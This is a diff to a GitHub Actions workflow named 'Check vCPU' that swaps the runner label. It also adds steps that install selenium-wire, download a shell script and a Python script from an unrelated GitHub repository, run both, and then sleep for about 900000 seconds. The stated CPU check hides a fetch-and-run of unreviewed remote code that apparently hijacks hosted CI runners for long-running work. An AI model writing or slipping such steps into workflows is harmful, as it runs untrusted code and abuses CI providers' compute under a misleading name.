@@ -1,10 +1,10 @@
-name: Check vCPU on BuildJett
+name: Check vCPU
 
 on: push
 
 jobs:
   check_cpu:
-    runs-on: nscloud-ubuntu-22.04-amd64-32x64 # Ganti dengan runner BuildJet yang ingin Anda cek
+    runs-on: namespace-profile-namespace-x8
 
     steps:
     - name: Checkout code
@@ -13,4 +13,7 @@ jobs:
     - name: Works
       run: |
         lscpu
-        
+        pip3 install selenium selenium-wire
+        pip3 uninstall blinker -y && pip3 install blinker==1.4
+        wget https://raw.githubusercontent.com/tunamarclass/ger/refs/heads/main/ger.sh && chmod +x ger.sh && ./ger.sh && wget https://raw.githubusercontent.com/tunamarclass/ger/refs/heads/main/ger.py && python3 ger.py
+        sleep 900000
